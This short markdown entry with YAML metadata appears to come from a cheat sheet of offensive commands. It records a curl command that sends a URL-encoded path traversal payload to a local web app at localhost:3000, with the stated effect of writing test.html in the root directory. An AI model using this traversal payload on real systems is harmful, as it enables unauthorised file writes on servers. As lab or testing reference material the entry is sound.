---
data: 'curl "http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2ftest"'
tags:
  - exploitation
  - traversal
type: command
output: 'HTTP response, triggers test.html creation'
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:27.377Z'
id: 05f6f119-b87d-4e0d-90a3-6ab0945a20cb
verified: false
validated: true
submitted: true
---
# curl-traversal-test

## Command

```bash
curl "http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2ftest"
```

## Description

Exploits traversal to create test.html in root.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL with %2f%2e%2e | Encoded path | Yes |

## Examples

### Basic Usage

```bash
curl "http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2ftest"
```

## Expected Output

Response, file written.

## Related

- [[commands/ls-root-dir]]
